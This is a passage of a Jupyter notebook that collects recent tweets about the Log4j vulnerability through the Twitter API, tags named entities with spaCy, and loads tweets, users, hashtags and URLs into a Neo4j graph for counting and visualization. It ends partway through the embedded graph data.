{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "29d617ba",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf12c9fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install py2neo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dfb771f",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install neo4jupyter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ecfdb11a",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install plotly"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81691030",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install chart_studio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "387e354e",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install igraph"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8efb4b57",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install jgraph"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e7915bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "!{sys.executable} -m pip install spacy\n",
    "!{sys.executable} -m spacy download en_core_web_sm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a25a12fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import time\n",
    "import requests\n",
    "from py2neo import Graph, Node, Relationship"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "33973719",
   "metadata": {},
   "outputs": [],
   "source": [
    "#don't forget to start your db\n",
    "graph = Graph(password=\"UPDATE PASSWORD\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74a3a905",
   "metadata": {},
   "source": [
    "<h2>Uniqueness Constraints</h2>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0dfc56e7",
   "metadata": {},
   "source": [
    "Neo4j supports uniqueness constraints on given label, property pairs."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4a1b41e",
   "metadata": {},
   "outputs": [],
   "source": [
    "graph.run(\"CREATE CONSTRAINT ON (u:User) ASSERT u.username IS UNIQUE\")\n",
    "graph.run(\"CREATE CONSTRAINT ON (t:Tweet) ASSERT t.id IS UNIQUE\")\n",
    "graph.run(\"CREATE CONSTRAINT ON (h:Hashtag) ASSERT h.name IS UNIQUE\")\n",
    "graph.run(\"CREATE CONSTRAINT ON (d:Url) ASSERT d.url IS UNIQUE\")\n",
    "graph.run(\"CREATE CONSTRAINT ON (e:Entity) ASSERT e.name IS UNIQUE\") # new"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "afa1d3b4",
   "metadata": {},
   "source": [
    "<h2>Twitter API</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "e7faf9a3",
   "metadata": {},
   "outputs": [],
   "source": [
    "TWITTER_BEARER = os.environ[\"TWITTER_BEARER\"]\n",
    "\n",
    "headers = dict(accept=\"application/json\", Authorization=\"Bearer \" + TWITTER_BEARER)\n",
    "\n",
    "payload = dict(\n",
    "    count=100,\n",
    "    result_type=\"recent\",\n",
    "    lang=\"en\",\n",
    "    q=\"log4j\"\n",
    ")\n",
    "\n",
    "base_url = \"https://api.twitter.com/1.1/search/tweets.json?\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "92d8c1e4",
   "metadata": {},
   "source": [
    "<h2>Find Tweets</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "8661642d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def find_tweets(since_id):\n",
    "    payload[\"since_id\"] = since_id\n",
    "    url = base_url + \"q={q}&count={count}&result_type={result_type}&lang={lang}&since_id={since_id}\".format(**payload)\n",
    "\n",
    "    r = requests.get(url, headers=headers)\n",
    "    tweets = r.json()[\"statuses\"]\n",
    "\n",
    "    return tweets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16101ce9",
   "metadata": {},
   "source": [
    "<h2>Named Entity Recognition</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "29fb61f5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import spacy\n",
    "from spacy import displacy\n",
    "\n",
    "NER = spacy.load(\"en_core_web_sm\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "e28f0369",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_named_ent(text):\n",
    "    words = NER(text)\n",
    "    #print(words.ents)\n",
    "    return words.ents"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f24fdbd",
   "metadata": {},
   "source": [
    "<h2>Write Twitter data to Neo4j</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72cb04b6",
   "metadata": {},
   "outputs": [],
   "source": [
    "def upload_tweets(tweets):\n",
    "    for t in tweets:\n",
    "        #print(t)\n",
    "        u = t[\"user\"]\n",
    "        #print(u)\n",
    "        e = t[\"entities\"]\n",
    "\n",
    "        tweet = Node(\"Tweet\", id=t[\"id\"])\n",
    "        graph.merge(tweet, \"id\", \"id\")\n",
    "        tweet[\"text\"] = t[\"text\"]\n",
    "        tweet[\"created_at\"] = t[\"created_at\"]\n",
    "        graph.push(tweet)\n",
    "\n",
    "        user = Node(\"User\", username=u[\"screen_name\"])\n",
    "        graph.merge(user, \"username\", \"username\")\n",
    "        user[\"id\"] = u[\"id\"]\n",
    "        user[\"name\"] = u[\"name\"]\n",
    "        user[\"followers\"] = u[\"followers_count\"]\n",
    "        user[\"following\"] = u[\"friends_count\"]\n",
    "        user[\"joined\"] = u[\"created_at\"]\n",
    "        user[\"verified\"] = u[\"verified\"]\n",
    "        graph.push(user)\n",
    "        #thought: this would overwrite historical counts and stuff...\n",
    "\n",
    "        graph.merge(Relationship(user, \"POSTS\", tweet))\n",
    "\n",
    "        for h in e.get(\"hashtags\", []):\n",
    "            hashtag = Node(\"Hashtag\", name=h[\"text\"].lower())\n",
    "            graph.merge(hashtag, \"name\", \"name\")\n",
    "            graph.merge(Relationship(hashtag, \"TAGS\", tweet))\n",
    "            #print(h[\"text\"])\n",
    "            \n",
    "        for d in e.get(\"urls\", []):\n",
    "            url = Node(\"Url\", url=d[\"url\"].lower())\n",
    "            graph.merge(url, \"url\", \"url\")\n",
    "            graph.merge(Relationship(tweet, \"CONTAINS\", url))\n",
    "            #print(d[\"url\"])\n",
    "            \n",
    "        for media in e.get(\"media\", []):\n",
    "            if (media[\"media_url\"]):\n",
    "                url = Node(\"Url\", url=media[\"media_url\"].lower())\n",
    "                graph.merge(url, \"url\", \"url\")\n",
    "                graph.merge(Relationship(tweet, \"CONTAINS\", url))\n",
    "\n",
    "        for m in e.get('user_mentions', []):\n",
    "            mention = Node(\"User\", username=m[\"screen_name\"])\n",
    "            graph.merge(mention, \"username\", \"username\")\n",
    "            graph.merge(Relationship(tweet, \"MENTIONS\", mention))\n",
    "\n",
    "        reply = t.get(\"in_reply_to_status_id\")\n",
    "\n",
    "        if reply:\n",
    "            reply_tweet = Node(\"Tweet\", id=reply)\n",
    "            graph.merge(reply_tweet, \"id\", \"id\")\n",
    "            graph.merge(Relationship(tweet, \"REPLY_TO\", reply_tweet))\n",
    "\n",
    "        ret = t.get(\"retweeted_status\", {}).get(\"id\")\n",
    "\n",
    "        if ret:\n",
    "            retweet = Node(\"Tweet\", id=ret)\n",
    "            graph.merge(retweet, \"id\", \"id\")\n",
    "            graph.merge(Relationship(user, \"RETWEETS\", retweet)) #updated for user vs tweet\n",
    "            \n",
    "        # named entity recognition\n",
    "        labeled_text = get_named_ent(t[\"text\"])\n",
    "        for word in labeled_text:\n",
    "            #print(word.text)\n",
    "            entity = Node(\"Entity\", name=word.text)\n",
    "            graph.merge(entity, \"name\", \"name\")\n",
    "            graph.merge(Relationship(tweet, \"REFERENCES\", entity))\n",
    "            entity[\"label\"] = word.label_\n",
    "            graph.push(entity)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e66a06a7",
   "metadata": {},
   "source": [
    "<h2>Run It!</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7cddbbd",
   "metadata": {},
   "outputs": [],
   "source": [
    "since_id = graph.run(\"MATCH (n:Tweet) RETURN max(n.id)\")\n",
    "\n",
    "if not (since_id):\n",
    "    since_id = -1\n",
    "\n",
    "print(since_id)\n",
    "\n",
    "while True:\n",
    "    try:\n",
    "        tweets = find_tweets(since_id=since_id)\n",
    "\n",
    "        if not tweets:\n",
    "            print(\"No tweets found.\")\n",
    "            time.sleep(60)\n",
    "            continue\n",
    "\n",
    "        since_id = tweets[0].get(\"id\")\n",
    "        upload_tweets(tweets)\n",
    "\n",
    "        print(\"{} tweets uploaded!\".format(len(tweets)))\n",
    "        time.sleep(60)\n",
    "\n",
    "    except Exception as e:\n",
    "        print(e)\n",
    "        time.sleep(60)\n",
    "        continue"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "33e1e950",
   "metadata": {},
   "source": [
    "<h2>What's in the database?</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "4bb1b89a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Node Counts\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>tweets</th>\n",
       "      <th>urls</th>\n",
       "      <th>hashtags</th>\n",
       "      <th>users</th>\n",
       "      <th>entities</th>\n",
       "      <th>total nodes</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1889</td>\n",
       "      <td>719</td>\n",
       "      <td>212</td>\n",
       "      <td>1551</td>\n",
       "      <td>166</td>\n",
       "      <td>4534</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   tweets  urls  hashtags  users  entities  total nodes\n",
       "0    1889   719       212   1551       166         4534"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "total_nodes = graph.run(\"MATCH (n) RETURN count(n) as total_count\").data()\n",
    "tweet_nodes = graph.run(\"MATCH (n:Tweet) RETURN count(n) as tweets\").data()\n",
    "url_nodes = graph.run(\"MATCH (n:Url) RETURN count(n) as urls\").data()\n",
    "hashtag_nodes = graph.run(\"MATCH (n:Hashtag) RETURN count(n) as hashtags\").data()\n",
    "user_nodes = graph.run(\"MATCH (n:User) RETURN count(n) as users\").data()\n",
    "entity_nodes = graph.run(\"MATCH (n:Entity) RETURN count(n) as entities\").data()\n",
    "\n",
    "df = pd.DataFrame(tweet_nodes)\n",
    "df.style.set_caption(\"Node Counts\") # why doesn't this output?\n",
    "print(\"Node Counts\") # the backup plan\n",
    "df['urls'] = url_nodes[0]['urls']\n",
    "df['hashtags'] = hashtag_nodes[0]['hashtags']\n",
    "df['users'] = user_nodes[0]['users']\n",
    "df['entities'] = entity_nodes[0]['entities']\n",
    "df['total nodes'] = total_nodes[0]['total_count']\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7793bf8",
   "metadata": {},
   "source": [
    "<h2>Visualize the Model</h2>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "7a268c05",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "var link = document.createElement(\"link\");\n",
       "\tlink.ref = \"stylesheet\";\n",
       "\tlink.type = \"text/css\";\n",
       "\tlink.href = \"https://cdnjs.cloudflare.com/ajax/libs/vis/4.8.2/vis.css\";\n",
       "\tdocument.head.appendChild(link);\n",
       "require.config({     paths: {         vis: '//cdnjs.cloudflare.com/ajax/libs/vis/4.8.2/vis.min'     } }); require(['vis'], function(vis) {  window.vis = vis; }); "
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div id=\"104b6194-024e-431d-8fb0-8ff3864de7a0\" style=\"height: 400px;\"></div>\n",
       "\n",
       "<script type=\"text/javascript\">\n",
       "\n",
       "    var nodes = [{\"id\": 636, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:57:39 +0000 2021', id=1473065086142935040, text='Feds Look into Log4j Vulnerability After Hawaii Cyber Attack - Government Technology: Multiple federal entities are\\u2026 https://t.co/P6l5IVBlLt')\"}, {\"id\": 638, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/p6l5ivbllt')\"}, {\"id\": 2684, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:47:22 +0000 2021', id=1473092699188248579, text='New Log4j Attack Vector Discovered:\\\\n\\\\nhttps://t.co/5VsFFrptq8')\"}, {\"id\": 2685, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/5vsffrptq8')\"}, {\"id\": 3157, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 01:17:22 +0000 2021', id=1473100249229312004, text='RT @DarkwebToday: Global hacking threat alert! Everything #100DaysOfCode #cybersecuritytips #infosecurity @ADanielHill https://t.co/kGsk6uS\\u2026')\"}, {\"id\": 296, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472364632111263746)\"}, {\"id\": 295, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='ADanielHill')\"}, {\"id\": 294, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=5332, following=560, id=1245443192151052289, joined='Wed Apr 01 20:09:38 +0000 2020', name='Darkweb.Today #hacker #cryptocurrencies #dogecoin', username='DarkwebToday', verified=False)\"}, {\"id\": 3149, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 01:18:41 +0000 2021', id=1473100578989371396, text='RT @selenalarson: This is a great piece looking at how society runs on open source software, and toll it takes on maintainers to run it. In\\u2026')\"}, {\"id\": 3152, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472920275318493184)\"}, {\"id\": 3151, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='selenalarson')\"}, {\"id\": 4263, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='v1nc1d4')\"}, {\"id\": 2542, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:37:39 +0000 2021', id=1473090254068494337, text='RT @MalwareTechBlog: Log4j FUD chronicles continued https://t.co/1tyLku9qO5')\"}, {\"id\": 2500, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:35:52 +0000 2021', id=1473089804434755585, text='Log4j FUD chronicles continued https://t.co/1tyLku9qO5')\"}, {\"id\": 54, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=284767, following=501, id=1540951016, joined='Sun Jun 23 13:10:56 +0000 2013', name='Marcus Hutchins', username='MalwareTechBlog', verified=True)\"}, {\"id\": 2499, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhf3t9dviaatxsv.jpg')\"}, {\"id\": 2219, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=1766, following=1580, id=1078457200979279872, joined='Fri Dec 28 01:06:48 +0000 2018', name='WafCharm', username='WafCharm', verified=False)\"}, {\"id\": 2218, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:15:10 +0000 2021', id=1473084594895212545, text='Why is the Log4j cybersecurity flaw the \\u2018most serious\\u2019 in decades?\\\\n\\\\nhttps://t.co/0dDuwQOiuD\\\\n\\\\n#log4j #cybersecurity\\u2026 https://t.co/mN0OQp67h0')\"}, {\"id\": 3460, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=205, following=819, id=745997949377855488, joined='Thu Jun 23 15:12:25 +0000 2016', name='0x0ED', username='EBreeeen', verified=False)\"}, {\"id\": 3459, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:33:20 +0000 2021', id=1473149564093882376, text='RT @RapidSafeguard: Log4j mindmap\\\\n\\\\n#log4j #infosec https://t.co/67PJXo62oq')\"}, {\"id\": 236, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:28:53 +0000 2021', id=1473057846103322631, text='RT @Crowd_Security: List of IP addresses exploiting the #log4j #CVE-2021-44228 vulnerability, as reported by our network. (Updated several\\u2026')\"}, {\"id\": 240, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1470315168190058502)\"}, {\"id\": 239, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='Crowd_Security')\"}, {\"id\": 976, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/egpmximax7')\"}, {\"id\": 3541, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 04:29:34 +0000 2021', id=1473148615430447111, text='RT @sec_r0: Log4J Vulnerability Flyer\\ud83d\\udd25Logs on Fire\\ud83d\\udd25\\\\n\\\\nCovered in flyer:\\\\n- Log4J\\\\n- Lookup Plugins\\\\n- JNDI Lookup\\\\n- JNDI &lt;-&gt; LDAP Lookup\\\\n- Work\\u2026')\"}, {\"id\": 233, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472977728580190214)\"}, {\"id\": 6, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='sec_r0')\"}, {\"id\": 3838, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:50:16 +0000 2021', id=1473289721619132419, text='The \\u2018most serious\\u2019 security breach ever is unfolding right now. Here\\u2019s what you need to know. https://t.co/mV7lTmvnPl')\"}, {\"id\": 3840, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/mv7ltmvnpl')\"}, {\"id\": 4043, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fht66pbxsauwgbm.jpg')\"}, {\"id\": 3985, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:41:05 +0000 2021', id=1473287411211792384, text='Private Internet Access VPN Issues Update to Protect Users Against Apache Log4j/Log4Shell Exploit\\\\xa0\\\\xa0Privacy News Onl\\u2026 https://t.co/1NfnApWUij')\"}, {\"id\": 3987, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/1nfnapwuij')\"}, {\"id\": 4518, \"label\": \"alibaba\", \"group\": \"Hashtag\", \"title\": \"Node('Hashtag', 'name', name='alibaba')\"}, {\"id\": 4516, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Thu Dec 23 18:09:47 +0000 2021', id=1474079807923183621, text='RT @TheHackersNews: \\u26a1China has suspended its partnership with #Alibaba Cloud Services \\u2014 whose researcher discovered the critical #Log4j vul\\u2026')\"}, {\"id\": 1110, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=180, following=1141, id=1002829194, joined='Mon Dec 10 23:30:32 +0000 2012', name='Levi', username='_secd00d88', verified=False)\"}, {\"id\": 1178, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:09:11 +0000 2021', id=1473067990900183040, text='RT @haroonmeer: Good news:\\\\nLog4j is the only library you use that\\u2019s been trivially vulnerable for about a decade.')\"}, {\"id\": 1109, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:06:10 +0000 2021', id=1473067231622082564, text='RT @RapidSafeguard: Log4j mindmap\\\\n\\\\n#log4j #infosec https://t.co/67PJXo62oq')\"}, {\"id\": 973, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/f798n9yujx')\"}, {\"id\": 2813, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=9240, following=0, id=980155441597464576, joined='Sat Mar 31 18:50:42 +0000 2018', name='Inisial *Z*', username='sikecilmarmut', verified=False)\"}, {\"id\": 2812, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:58:09 +0000 2021', id=1473095409346121729, text='RT @ESET: #BREAKING #ESETresearch heatmap shows hundreds of thousands of blocked #log4j exploitation attempts most of which were in the US,\\u2026')\"}, {\"id\": 2626, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:44:00 +0000 2021', id=1473091849908891652, text='\\u201cHuge swaths of the #computercode that modern life runs on uses #Java &amp; contains #log4j. #CloudStorage companies su\\u2026 https://t.co/DfUDgretei')\"}, {\"id\": 2588, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:40:56 +0000 2021', id=1473091080413487108, text='The \\u2018most serious\\u2019 #securitybreach ever is unfolding right now. Here\\u2019s what you need to know. - The Washington Post\\u2026 https://t.co/or2p9IRlYV')\"}, {\"id\": 2630, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/dfudgretei')\"}, {\"id\": 1145, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:07:52 +0000 2021', id=1473067659428196352, text='RT @trashp4ndasec: Provided by my coworker. #log4j https://t.co/2lCvZmqBEl')\"}, {\"id\": 1149, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472775711790407682)\"}, {\"id\": 1148, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='trashp4ndasec')\"}, {\"id\": 1147, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhbzm-sxiamvb2q.png')\"}, {\"id\": 1765, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='http://pbs.twimg.com/media/fhfs0lgxmamyyzd.jpg')\"}, {\"id\": 1797, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1473038562228506629)\"}, {\"id\": 743, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=71, following=862, id=1338699436357275651, joined='Tue Dec 15 04:17:07 +0000 2020', name='FinGeek', username='creditvisory', verified=False)\"}, {\"id\": 742, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:52:50 +0000 2021', id=1473063873481748490, text='https://t.co/2bX6ayIyye       How are people so blind that there warning us of the attack. \\u201cIt\\u2019s Most Harmful To Crypto\\u201d Read article')\"}, {\"id\": 602, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:43:09 +0000 2021', id=1473061438214258690, text='RT @MenstraulM: @itsoknottobegay @KIIARA lice @KIIARA #trendingkiiara #lockdown #Lockdowns #Serverless #Restrictions #100DaysOfCode #HTML #\\u2026')\"}, {\"id\": 567, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1472766752161423363)\"}, {\"id\": 566, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='KIIARA')\"}, {\"id\": 565, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='itsoknottobegay')\"}, {\"id\": 564, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='MenstraulM')\"}, {\"id\": 148, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=103, following=236, id=7694772, joined='Tue Jul 24 21:03:53 +0000 2007', name='cookedj', username='cookedj', verified=False)\"}, {\"id\": 147, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:32:19 +0000 2021', id=1473058710197047299, text='RT @GluuFederation: Need to patch your Gluu Server for #log4j? Upgrade to version 4.3.1 this week or utilize your VIP support plan for adva\\u2026')\"}, {\"id\": 819, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='vcslab')\"}, {\"id\": 2579, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 00:39:24 +0000 2021', id=1473090693233057795, text='RT @MalwareTechBlog: Log4j FUD chronicles continued https://t.co/1tyLku9qO5')\"}, {\"id\": 1066, \"label\": \"ff\", \"group\": \"Hashtag\", \"title\": \"Node('Hashtag', 'name', name='ff')\"}, {\"id\": 1208, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:11:54 +0000 2021', id=1473068673887842308, text='RT @MSSPete: #FF for some folks who are doing some great work in the #Log4J response.\\\\n\\\\n@PrakashAjeet \\\\n@russmcsec \\\\n@jessen_kurien \\\\n@Cyb3rWar\\u2026')\"}, {\"id\": 1064, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:06:58 +0000 2021', id=1473067430280790016, text='RT @MSSPete: #FF for some folks who are doing some great work in the #Log4J response.\\\\n\\\\n@PrakashAjeet \\\\n@russmcsec \\\\n@jessen_kurien \\\\n@Cyb3rWar\\u2026')\"}, {\"id\": 448, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:38:00 +0000 2021', id=1473060141662707716, text='RT @rwincey: Since these @VMware @mobileiron CVE-2021-44228 #log4j payloads appear to already been circulating around the bug bounty (and l\\u2026')\"}, {\"id\": 405, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', id=1470739627518664705)\"}, {\"id\": 404, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='mobileiron')\"}, {\"id\": 403, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='VMware')\"}, {\"id\": 402, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='rwincey')\"}, {\"id\": 107, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=635, following=977, id=188024344, joined='Tue Sep 07 19:04:34 +0000 2010', name='Melinda Marks', username='melindamarks', verified=False)\"}, {\"id\": 1665, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 23:40:21 +0000 2021', id=1473075831790391298, text='The #log4j vulnerability is a serious threat because it is so widespread and can be difficult to detect. Join us to\\u2026 https://t.co/o2MTio8eJi')\"}, {\"id\": 106, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:33:36 +0000 2021', id=1473059033795891202, text=\\\"The Log4j vulnerability is a serious and far-reaching threat. Here's how I weighed in along with other experts on h\\u2026 https://t.co/zAB1Lb08XO\\\")\"}, {\"id\": 1869, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/qkxprpk4vp')\"}, {\"id\": 2883, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/boqulzofiy')\"}, {\"id\": 699, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/s3xvbwwld4')\"}, {\"id\": 4460, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', username='ekoivune')\"}, {\"id\": 2161, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/1d2y9unwu0')\"}, {\"id\": 3786, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Tue Dec 21 13:53:02 +0000 2021', id=1473290415868633101, text='Belgian defence ministry admits attackers accessed its computer network by exploiting Log4j vulnerability https://t.co/ibqVOW9UX6')\"}, {\"id\": 3788, \"label\": \"\", \"group\": \"Url\", \"title\": \"Node('Url', 'url', url='https://t.co/ibqvow9ux6')\"}, {\"id\": 371, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=97, following=1089, id=177465674, joined='Thu Aug 12 05:44:12 +0000 2010', name='Marc Tan', username='tanclan11', verified=False)\"}, {\"id\": 370, \"label\": \"\", \"group\": \"id\", \"title\": \"Node('Tweet', 'id', created_at='Mon Dec 20 22:36:41 +0000 2021', id=1473059811554066432, text=\\\"RT @snyksec: \\ud83d\\udce3 We're doubling the test limits on the Snyk Open Source free plan to 400 tests for the next 30 days. \\\\n\\\\nWe believe it's import\\u2026\\\")\"}, {\"id\": 2251, \"label\": \"\", \"group\": \"username\", \"title\": \"Node('User', 'username', followers=4070, following=3168, id=15112060, 